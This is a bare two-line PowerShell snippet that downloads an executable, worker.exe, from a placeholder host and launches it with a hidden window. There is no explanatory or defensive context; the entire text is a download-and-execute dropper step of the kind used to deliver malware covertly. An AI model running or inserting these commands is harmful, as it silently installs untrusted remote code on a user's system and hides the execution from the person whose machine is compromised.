Invoke-WebRequest -Uri 'https://files.example.invalid/worker.exe' -OutFile $payload
Start-Process -FilePath $payload -WindowStyle Hidden
